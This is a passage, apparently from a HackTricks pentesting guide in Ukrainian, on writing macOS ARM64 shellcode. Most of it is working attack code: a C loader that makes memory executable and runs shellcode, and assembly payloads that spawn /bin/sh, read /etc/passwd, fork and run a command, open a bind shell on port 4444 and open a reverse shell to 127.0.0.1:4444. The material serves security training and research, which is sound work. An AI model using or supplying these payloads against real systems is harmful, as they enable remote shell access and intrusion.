for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Для новіших версій macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C-код для тестування shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Взято з [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) та пояснено.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Читання за допомогою cat

Мета — виконати `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, тому другий аргумент (x1) — масив параметрів (що в пам'яті означає стек адрес).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Викликати команду через sh з fork'а, щоб головний процес не був завершений
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell з [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) у **port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

З [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell до **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
